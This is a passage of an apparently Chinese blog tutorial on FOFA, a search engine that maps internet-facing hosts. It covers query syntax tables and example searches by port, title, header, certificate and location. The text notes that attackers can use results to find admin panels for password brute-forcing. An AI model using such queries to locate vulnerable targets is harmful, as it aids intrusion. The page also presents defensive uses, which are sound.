    <content type="html"><![CDATA[<div class="table-container"><table><thead><tr><th style="text-align:left">基础类（General）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">ip</td><td><a href="https://fofa.info/result?qbase64=aXA9IjEuMS4xLjEi">ip=”1.1.1.1”</a></td><td>通过单一IPv4地址进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXA9IjIyMC4xODEuMTExLjEvMjQi">ip=”220.181.111.1/24”</a></td><td>通过IPv4 C段进行查询</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXA9IjI2MDA6OTAwMDoyMDJhOjI2MDA6MTg6NGFiNzpmNjAwOjkzYTEi">ip=”2600:9000:202a:2600:18:4ab7:f600:93a1”</a></td><td>通过单一Ipv6地址进行查询</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left">port</td><td><a href="https://fofa.info/result?qbase64=cG9ydD0iNjM3OSI=">port=”6379”</a></td><td>通过端口号进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">domain</td><td><a href="https://fofa.info/result?qbase64=ZG9tYWluPSJxcS5jb20i">domain=”qq.com”</a></td><td>通过根域名进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">host</td><td><a href="https://fofa.info/result?qbase64=aG9zdD0iLmZvZmEuaW5mbyI=">host=”.fofa.info”</a></td><td>通过主机名进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">os</td><td><a href="https://fofa.info/result?qbase64=b3M9ImNlbnRvcyI=">os=”centos”</a></td><td>通过操作系统进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">server</td><td><a href="https://fofa.info/result?qbase64=c2VydmVyPSJNaWNyb3NvZnQtSUlTLzEwIg==">server=”Microsoft-IIS/10”</a></td><td>通过服务器进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">asn</td><td><a href="https://fofa.info/result?qbase64=YXNuPSIxOTU1MSI=">asn=”19551”</a></td><td>通过自治系统号进行搜索</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">org</td><td><a href="https://fofa.info/result?qbase64=b3JnPSJMTEMgQmF4ZXQi">org=”LLC Baxet”</a></td><td>通过所属组织进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">is_domain</td><td><a href="https://fofa.info/result?qbase64=aXNfZG9tYWluPXRydWU=">is_domain=true</a></td><td>筛选拥有域名的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfZG9tYWluPWZhbHNl">is_domain=false</a></td><td>筛选没有域名的资产</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">is_ipv6</td><td><a href="https://fofa.info/result?qbase64=aXNfaXB2Nj10cnVl">is_ipv6=true</a></td><td>筛选是ipv6的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfaXB2Nj1mYWxzZQ==">is_ipv6=false</a></td><td>筛选是ipv4的资产</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">标记类（Special Label）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">app</td><td><a href="https://fofa.info/result?qbase64=YXBwPSJNaWNyb3NvZnQtRXhjaGFuZ2Ui">app=”Microsoft-Exchange”</a></td><td>通过FOFA整理的规则进行查询</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">fid</td><td><a href="https://fofa.info/result?qbase64=ZmlkPSJzU1hYR05VTzJGZWZCVGNDTElULzJRPT0i">fid=”sSXXGNUO2FefBTcCLIT/2Q==”</a></td><td>通过FOFA聚合的站点指纹进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">product</td><td><a href="https://fofa.info/result?qbase64=cHJvZHVjdD0iTkdJTlgi">product=”NGINX”</a></td><td>通过FOFA标记的产品名进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">category</td><td><a href="https://fofa.info/result?qbase64=Y2F0ZWdvcnk9IuacjeWKoSI=">category=”服务”</a></td><td>通过FOFA标记的分类进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">type</td><td><a href="https://fofa.info/result?qbase64=dHlwZT0ic2VydmljZSI=">type=”service”</a></td><td>筛选协议资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=dHlwZT0ic3ViZG9tYWluIg==">type=”subdomain”</a></td><td>筛选服务（网站类）资产</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">cloud_name</td><td><a href="https://fofa.info/result?qbase64=Y2xvdWRfbmFtZT0iQWxpeXVuZHVuIg==">cloud_name=”Aliyundun”</a></td><td>通过云服务商进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">is_cloud</td><td><a href="https://fofa.info/result?qbase64=aXNfY2xvdWQ9dHJ1ZQ==">is_cloud=true</a></td><td>筛选是云服务的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfY2xvdWQ9ZmFsc2U=">is_cloud=false</a></td><td>筛选不是云服务的资产</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">is_fraud</td><td><a href="https://fofa.info/result?qbase64=aXNfZnJhdWQ9dHJ1ZQ==">is_fraud=true</a></td><td>筛选是仿冒垃圾站群的资产 （专业版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfZnJhdWQ9ZmFsc2U=">is_fraud=false</a></td><td>筛选不是仿冒垃圾站群的资产（已默认筛选）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">is_honeypot</td><td><a href="https://fofa.info/result?qbase64=aXNfaG9uZXlwb3Q9dHJ1ZQ==">is_honeypot=true</a></td><td>筛选是蜜罐的资产 （专业版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfaG9uZXlwb3Q9ZmFsc2U=">is_honeypot=false</a></td><td>筛选不是蜜罐的资产（已默认筛选）</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">协议类 （type=service)</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">protocol</td><td><a href="https://fofa.info/result?qbase64=cHJvdG9jb2w9InF1aWMi">protocol=”quic”</a></td><td>通过协议名称进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">banner</td><td><a href="https://fofa.info/result?qbase64=YmFubmVyPSJ1c2VycyI=">banner=”users”</a></td><td>通过协议返回信息进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">base_protocol</td><td><a href="https://fofa.info/result?qbase64=YmFzZV9wcm90b2NvbD0idWRwIg==">base_protocol=”udp”</a></td><td>查询传输层为udp协议的资产</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=YmFzZV9wcm90b2NvbD0idGNwIg==">base_protocol=”tcp”</a></td><td>查询传输层为tcp协议的资产</td><td>✓</td><td>✓</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">网站类（type=subdomain）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">title</td><td><a href="https://fofa.info/result?qbase64=dGl0bGU9ImJlaWppbmci">title=”beijing”</a></td><td>通过网站标题进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">header</td><td><a href="https://fofa.info/result?qbase64=aGVhZGVyPSJlbGFzdGljIg==">header=”elastic”</a></td><td>通过响应标头进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">header_hash</td><td><a href="https://fofa.info/result?qbase64=aGVhZGVyX2hhc2g9IjEyNTg4NTQyNjUi">header_hash=”1258854265”</a></td><td>通过http/https响应头计算的hash值进行查询 （个人版及以上）</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">body</td><td><a href="https://fofa.info/result?qbase64=Ym9keT0i572R57uc56m66Ze05rWL57uYIg==">body=”网络空间测绘”</a></td><td>通过HTML正文进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">body_hash</td><td><a href="https://fofa.info/result?qbase64=Ym9keV9oYXNoPSItMjA5MDk2MjQ1MiI=">body_hash=”-2090962452”</a></td><td>通过HTML正文计算的hash值进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">js_name</td><td><a href="https://fofa.info/result?qbase64=anNfbmFtZT0ianMvanF1ZXJ5LmpzIg==">js_name=”js/jquery.js”</a></td><td>通过HTML正文包含的JS进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">js_md5</td><td><a href="https://fofa.info/result?qbase64=anNfbWQ1PSI4MmFjM2YxNDMyN2E4YjdiYTQ5YmFhMjA4ZDRlYWExNSI=">js_md5=”82ac3f14327a8b7ba49baa208d4eaa15”</a></td><td>通过JS源码进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cname</td><td><a href="https://fofa.info/result?qbase64=Y25hbWU9ImFwMjEuaW5zdC5zaXRlZm9yY2UuY29tIg==">cname=”ap21.inst.siteforce.com”</a></td><td>通过别名记录进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cname_domain</td><td><a href="https://fofa.info/result?qbase64=Y25hbWVfZG9tYWluPSJzaXRlZm9yY2UuY29tIg==">cname_domain=”siteforce.com”</a></td><td>通过别名记录解析的主域名进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">icon_hash</td><td><a href="https://fofa.info/result?qbase64=aWNvbl9oYXNoPSItMjQ3Mzg4ODkwIg==">icon_hash=”-247388890”</a></td><td>通过网站图标的hash值进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">status_code</td><td><a href="https://fofa.info/result?qbase64=c3RhdHVzX2NvZGU9IjQwMiI=">status_code=”402”</a></td><td>筛选服务状态为402的服务（网站）资产</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">icp</td><td><a href="https://fofa.info/result?qbase64=aWNwPSLkuqxJQ1Dor4EwMzAxNzPlj7ci">icp=”京ICP证030173号”</a></td><td>通过HTML正文包含的ICP备案号进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">sdk_hash</td><td><a href="https://fofa.info/result?qbase64=c2RrX2hhc2g9PSJNa2I0TXM0Ujk2Z2x2L1Q2VFJ6d1BXaDNVRGF0QnFlRiI=">sdk_hash==”Mkb4Ms4R96glv/T6TRzwPWh3UDatBqeF”</a></td><td>通过网站嵌入的第三方代码计算的hash值进行查询 （商业版及以上）</td><td>✓</td><td>✓</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">地理位置（Location）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">country</td><td><a href="https://fofa.info/result?qbase64=Y291bnRyeT0iQ04i">country=”CN”</a></td><td>通过国家的简称代码进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y291bnRyeT0i5Lit5Zu9Ig==">country=”中国”</a></td><td>通过国家中文名称进行查询</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left">region</td><td><a href="https://fofa.info/result?qbase64=cmVnaW9uPSJaaGVqaWFuZyI=">region=”Zhejiang”</a></td><td>通过省份/地区英文名称进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=cmVnaW9uPSLmtZnmsZ8i">region=”浙江”</a></td><td>通过省份/地区中文名称进行查询（仅支持中国地区）</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left">city</td><td><a href="https://fofa.info/result?qbase64=Y2l0eT0iSGFuZ3pob3Ui">city=”Hangzhou”</a></td><td>通过城市英文名称进行查询</td><td>✓</td><td>✓</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">证书类</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">cert</td><td><a href="https://fofa.info/result?qbase64=Y2VydD0iYmFpZHUi">cert=”baidu”</a></td><td>通过证书进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.subject</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5zdWJqZWN0PSJPcmFjbGUgQ29ycG9yYXRpb24i">cert.subject=”Oracle Corporation”</a></td><td>通过证书的持有者进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.issuer</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc3N1ZXI9IkRpZ2lDZXJ0Ig==">cert.issuer=”DigiCert”</a></td><td>通过证书的颁发者进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.subject.org</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5zdWJqZWN0Lm9yZz0iT3JhY2xlIENvcnBvcmF0aW9uIg==">cert.subject.org=”Oracle Corporation”</a></td><td>通过证书持有者的组织进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.subject.cn</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5zdWJqZWN0LmNuPSJiYWlkdS5jb20i">cert.subject.cn=”baidu.com”</a></td><td>通过证书持有者的通用名称进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.issuer.org</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc3N1ZXIub3JnPSJjUGFuZWwsIEluYy4i">cert.issuer.org=”cPanel, Inc.”</a></td><td>通过证书颁发者的组织进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.issuer.cn</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc3N1ZXIuY249IlN5bm9sb2d5IEluYy4gQ0Ei">cert.issuer.cn=”Synology Inc. CA”</a></td><td>通过证书颁发者的通用名称进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.is_valid</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc192YWxpZD10cnVl">cert.is_valid=true</a></td><td>筛选证书是有效证书的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y2VydC5pc192YWxpZD1mYWxzZQ==">cert.is_valid=false</a></td><td>筛选证书是无效证书的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">cert.is_match</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc19tYXRjaD10cnVl">cert.is_match=true</a></td><td>筛选证书和域名匹配的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y2VydC5pc19tYXRjaD1mYWxzZQ==">cert.is_match=false</a></td><td>筛选证书和域名不匹配的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">cert.is_expired</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc19leHBpcmVkPXRydWU=">cert.is_expired=true</a></td><td>筛选证书已过期的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y2VydC5pc19leHBpcmVkPWZhbHNl">cert.is_expired=false</a></td><td>筛选证书未过期的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">jarm</td><td><a href="https://fofa.info/result?qbase64=amFybT0iMmFkMmFkMDAwMmFkMmFkMjJjMmFkMmFkMmFkMmFkMmVhYzkyZWMzNGJjYzBjZjc1MjBlOTc1NDdmODNlODEi">jarm=”2ad2ad0002ad2ad22c2ad2ad2ad2ad2eac92ec34bcc0cf7520e97547f83e81”</a></td><td>通过JARM指纹进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">tls.version</td><td><a href="https://fofa.info/result?qbase64=dGxzLnZlcnNpb249IlRMUyAxLjMi">tls.version=”TLS 1.3”</a></td><td>通过tls的协议版本进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">tls.ja3s</td><td><a href="https://fofa.info/result?qbase64=dGxzLmphM3M9IjE1YWY5NzdjZTI1ZGU0NTJiOTZhZmZhMmFkZGIxMDM2Ig==">tls.ja3s=”15af977ce25de452b96affa2addb1036”</a></td><td>通过tls的ja3s指纹进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">时间类（Last update time）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">after</td><td><a href="https://fofa.info/result?qbase64=YWZ0ZXI9IjIwMjMtMDEtMDEi">after=”2023-01-01”</a></td><td>筛选某一时间之后有更新的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">before</td><td><a href="https://fofa.info/result?qbase64=YmVmb3JlPSIyMDIzLTEyLTAxIg==">before=”2023-12-01”</a></td><td>筛选某一时间之前有更新的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">after&amp;before</td><td><a href="https://fofa.info/result?qbase64=YWZ0ZXI9IjIwMjMtMDEtMDEiICYmIGJlZm9yZT0iMjAyMy0xMi0wMSI=">after=”2023-01-01” &amp;&amp; before=”2023-12-01”</a></td><td>筛选某一时间区间有更新的资产</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">独立IP语法（独立IP系列语法，不可和上面其他语法共用）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">port_size</td><td><a href="https://fofa.info/result?qbase64=cG9ydF9zaXplPSI2Ig==">port_size=”6”</a></td><td>筛选开放端口数量等于6个的独立IP （个人版及以上）</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">port_size_gt</td><td><a href="https://fofa.info/result?qbase64=cG9ydF9zaXplX2d0PSI2Ig==">port_size_gt=”6”</a></td><td>筛选开放端口数量大于6个的独立IP （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">port_size_lt</td><td><a href="https://fofa.info/result?qbase64=cG9ydF9zaXplX2x0PSIxMiI=">port_size_lt=”12”</a></td><td>筛选开放端口数量小于12个的独立IP （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_ports</td><td><a href="https://fofa.info/result?qbase64=aXBfcG9ydHM9IjgwLDE2MSI=">ip_ports=”80,161”</a></td><td>筛选同时开放不同端口的独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_country</td><td><a href="https://fofa.info/result?qbase64=aXBfY291bnRyeT0iQ04i">ip_country=”CN”</a></td><td>通过国家的简称代码进行查询独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_region</td><td><a href="https://fofa.info/result?qbase64=aXBfcmVnaW9uPSJaaGVqaWFuZyI=">ip_region=”Zhejiang”</a></td><td>通过省份/地区英文名称进行查询独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_city</td><td><a href="https://fofa.info/result?qbase64=aXBfY2l0eT0iSGFuZ3pob3Ui">ip_city=”Hangzhou”</a></td><td>通过城市英文名称进行查询独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_after</td><td><a href="https://fofa.info/result?qbase64=aXBfYWZ0ZXI9IjIwMjEtMDMtMTgi">ip_after=”2021-03-18”</a></td><td>筛选某一时间之后有更新的独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_before</td><td><a href="https://fofa.info/result?qbase64=aXBfYmVmb3JlPSIyMDE5LTA5LTA5Ig==">ip_before=”2019-09-09”</a></td><td>筛选某一时间之前有更新的独立IP</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><h1 id="FOFA-是什么？"><a href="#FOFA-是什么？" class="headerlink" title="FOFA 是什么？"></a>FOFA 是什么？</h1><p>FOFA 是白帽汇推出的一款网络空间搜索引擎,它通过进行网络空间测绘,能够帮助研究人员或者企业迅速进行网络资产匹配,例如进行漏洞影响范围分析、应用分布统计、应用流行度等。<br>FOFA 搜索引擎检索到的内容主要是服务器，数据库，某个网站管理后台，路由器，交换机，公共ip的打印机，网络摄像头，门禁系统，Web服务 ……<br>FOFA 这类搜索引擎又有另一个名字：网络空间测绘系统。—— 它们就像是现实生活中的卫星地图那样，一点点勾勒出公共网络空间的样子，每一个网站、每一台公共环境下的服务器……当一个高危漏洞爆发，FOFA系统便能向卫星定位地址一样，通过特征迅速找到全网的脆弱设备。<br>网站：<a href="https://fofa.so/">https://fofa.so/</a> FOFA不仅提供了在线搜索还提供了FOFA Pro客户端版本<br><a href="https://redyanly.github.io/images/111.jpg"><img src="https://redyanly.github.io/images/111.jpg" alt="111"></a></p><p>注意：<br>1) 普通会员和高级会员的 免费100条 和 免费10000条 是指每天调用API可以免费获取前100条和前10000条,假设高级会员调用API,每页获取3333条，第1、2、3页由于没有超过前10000条，所以免费，第4页超过前10000条，所以会扣除1FOFA币。<br>2) 直接下载数据，无论多少条数据，都要花费FOFA币。<br>普通会员300 高级会员1000 终身制 。</p><h1 id="查询语法介绍"><a href="#查询语法介绍" class="headerlink" title="查询语法介绍"></a>查询语法介绍</h1><h2 id="1、怎么搜？"><a href="#1、怎么搜？" class="headerlink" title="1、怎么搜？"></a>1、怎么搜？</h2><p>首先FOFA作为一个搜索引擎，我们要熟悉它的查询语法，类似google语法，FOFA的语法也是简单易懂，主要分为检索字段以及运算符，所有的查询语句都是由这两种元素组成的。目前支持的检索字段包括：domain，host，ip，title，server，header，body，port，cert，country，city，os，appserver，middleware，language，tags，user_tag等等，支持的逻辑运算符包括：= ，==，!= ，&amp;&amp;，||。了解了检索字段和逻辑运算符之后，就基本掌握了FOFA的用法了。例如搜索title字段中存在后台的网站，我们只需要在输入栏中输入title=”后台”，输出的结果即为全网title中存在后台两个字的网站，对于黑客而言，可以利用得到的信息可以继续进行渗透攻击，对于网站的后台进行密码暴力破解，密码找回等等攻击行为，这样就可以轻松愉快的开始一次简单渗透攻击之旅，而企业用户也可以利用得到的信息进行内部的弱口令排查等等，防范于未然。</p><p>下面为大家一一介绍目前支持的所有检索字段的用法：</p><h3 id="1-1-domain"><a href="#1-1-domain" class="headerlink" title="1.1 domain"></a>1.1 domain</h3><p>例:搜索QQ所有的子域名 : domain=”qq.com”</p><h3 id="1-2-host"><a href="#1-2-host" class="headerlink" title="1.2 host"></a>1.2 host</h3><p>例:搜索host内所有带有qq.com的域名: host=”qq.com”</p><h3 id="1-3-ip"><a href="#1-3-ip" class="headerlink" title="1.3 ip"></a>1.3 ip</h3><p>例:搜索某个IP上的相关信息 ip=”58.63.236.248”<br>支持IP段搜索<br>ip=”111.1.1.1/8”<br>ip=”111.1.1.1/16”<br>ip=”111.1.1.1/24”</p><h3 id="1-4-title"><a href="#1-4-title" class="headerlink" title="1.4 title"></a>1.4 title</h3><p>例:搜索title包含有”漏洞”的IP title=”漏洞”</p><h3 id="1-5-server"><a href="#1-5-server" class="headerlink" title="1.5 server"></a>1.5 server</h3><p>例:Apache出来了一个高危漏洞,我们需要去统计全球的Apache server=”Apache”</p><h3 id="1-6-header"><a href="#1-6-header" class="headerlink" title="1.6 header"></a>1.6 header</h3><p>例:搜索前段时间非常火的海康威视 header=”Hikvision”</p><h3 id="1-7-body"><a href="#1-7-body" class="headerlink" title="1.7 body"></a>1.7 body</h3><p>例:假如我想搜索微博的后台,域名为:weibo.com并且网页内body包含”后台” body=”后台” &amp;&amp; domain=”weibo.com”</p><p>&amp;&amp;:与body=”后台” &amp;&amp; domain=”weibo.com” 提取域名为:weibo.com并且网页内body包含”后台”的网站 需要同时满足两个条件</p><h3 id="1-8-port"><a href="#1-8-port" class="headerlink" title="1.8 port"></a>1.8 port</h3><p>例:想要找非80端口 port!=”80”</p><p>!=: port!=”80”匹配端口不为80端口的服务</p><h3 id="1-9-cert"><a href="#1-9-cert" class="headerlink" title="1.9 cert"></a>1.9 cert</h3><p>搜索证书(https或者imaps等)</p><p>例:百度公司为了检查自己的域名是否还有心脏出血漏洞可以使用语法: cert=”baidu”</p><h3 id="1-10country"><a href="#1-10country" class="headerlink" title="1.10country"></a>1.10country</h3><p>搜索指定国家(编码)的资产</p><p>例:搜索中国的服务器 country=”CN”</p><p>注:country=”CN” country后面的规则为各国家的缩写,全球国家缩写如下链接:</p><p><a href="https://zhidao.baidu.com/question/538403206.html">https://zhidao.baidu.com/question/538403206.html</a></p><h3 id="1-11-city"><a href="#1-11-city" class="headerlink" title="1.11 city"></a>1.11 city</h3><p>搜索指定城市的资产</p><p>例:搜索上海的服务器 city=”Shanghai”</p><p>注:搜索城市时填写城市的全称,首字母必须大写!</p><h3 id="1-12-os"><a href="#1-12-os" class="headerlink" title="1.12 os"></a>1.12 os</h3><p>例:搜索centos所有主机 os=”centos”</p><p>了解了基础查询我们再来谈谈高级查询，其实也很简单，就是多个基础查询语句用逻辑连接符拼成的语句，例如我们要搜索上海的Discus组件，搜索语句是(title=”Discuz”||body=”content=”Discuz”) &amp;&amp; city=”Shanghai”</p><h3 id="amp-amp-逻辑与"><a href="#amp-amp-逻辑与" class="headerlink" title="&amp;&amp;:逻辑与"></a>&amp;&amp;:逻辑与</h3><h3 id="：逻辑或"><a href="#：逻辑或" class="headerlink" title="||：逻辑或"></a>||：逻辑或</h3><p>上面的语句意思为 (title=”Discuz”||body=”content=”Discuz”)与city=”Shanghai”这两个条件必须同时满足，(title=”Discuz”||body=”content=”Discuz”)中title=”Discuz” 与body=”content=”Discuz”满足一个即可。<br>利用高级搜索可以更细致的了解网络空间中每个用户关注的资产信息。</p><h2 id="2、搜什么？"><a href="#2、搜什么？" class="headerlink" title="2、搜什么？"></a>2、搜什么？</h2><p>FOFA可以从不同维度搜索网络组件，例如地区，端口号，网络服务，操作系统，网络协议等等。目前FOFA支持了多个网络组件的指纹识别，包括建站模块、分享模块、各种开发框架、安全监测平台、项目管理系统、企业管理系统、视频监控系统、站长平台、电商系统、广告联盟、前端库、路由器、SSL证书、服务器管理系统、CDN、Web服务器、WAF、CMS等等，详细信息可见（<a href="https://fofa.so/library）。">https://fofa.so/library）。</a></p><h3 id="网站模块"><a href="#网站模块" class="headerlink" title="网站模块"></a>网站模块</h3><p>pagespeed， mod_bwlimited， mod_auth_passthrough， mod_auth_pam， mod_fastcgi， mod_jk， mod_perl， mod_python， mod_rack， mod_rails， mod_ssl， mod_wsgi， mod_antiloris，</p><h3 id="广告联盟"><a href="#广告联盟" class="headerlink" title="广告联盟"></a>广告联盟</h3><p>doubleclick_ad， baidu广告联盟， Google_AdSense， Open_AdStream， adinfinity， adriver，</p><h3 id="反向代理服务器"><a href="#反向代理服务器" class="headerlink" title="反向代理服务器"></a>反向代理服务器</h3><p>squid， kangle反向代理， Varnish， Aicache， SJSWPS_ OiWPS， HAProxy_Report，</p><h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><p>PHP， ASP.NET， python， ruby， jsp， perl， nodejs， ASP，</p><h3 id="前端库"><a href="#前端库" class="headerlink" title="前端库"></a>前端库</h3><p>jquery， bootstrap， d3， jquery-ui， yui， AlloyUI，</p><h3 id="分享模块"><a href="#分享模块" class="headerlink" title="分享模块"></a>分享模块</h3><p>jiathis， ujian， 百度分享， joomla-facebook， addthis， hellobar，</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>百为路由， 锐捷NBR路由器， mikrotik， 中兴路由器， h3c路由器， jcg无线路由器， D-Link_VoIP_Wireless_Router， arrisi_Touchstone， ZyXEL， Ruckus， Motorola_SBG900， Wimax_CPE， Cisco_Cable_Modem， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， DI-804HV， 